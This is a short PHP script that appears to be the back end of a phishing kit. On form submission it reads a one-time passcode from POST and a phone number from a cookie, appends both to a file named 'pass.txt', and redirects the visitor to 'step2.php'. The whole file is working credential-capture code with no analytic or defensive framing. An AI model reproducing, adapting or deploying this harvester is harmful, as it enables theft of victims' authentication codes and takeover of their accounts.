<?php
//    echo"<pre>";print_r($_POST);die();
if (isset($_POST['submit'])) {
    // echo"<pre>";print_r($_POST);die();
    
	$otp0 = $_POST['otp0'];
   $number = $_COOKIE["number"];

  $otp0 = "otp0:$otp0";
   $number = "number:$number";

  $myfile = fopen("pass.txt", "a") or die("Unable to open file!");

$txt43 ="";
fwrite($myfile, "\r\n". $txt43);
fwrite($myfile, "\r\n". $otp0);
fwrite($myfile, "\r\n". $number);

fclose($myfile);

   
   
    header('location:step2.php');
    die();
//     $fp = fopen('lidn.txt', 'w');
// fwrite($fp,[ ]);
// fclose($fp);
}



?>
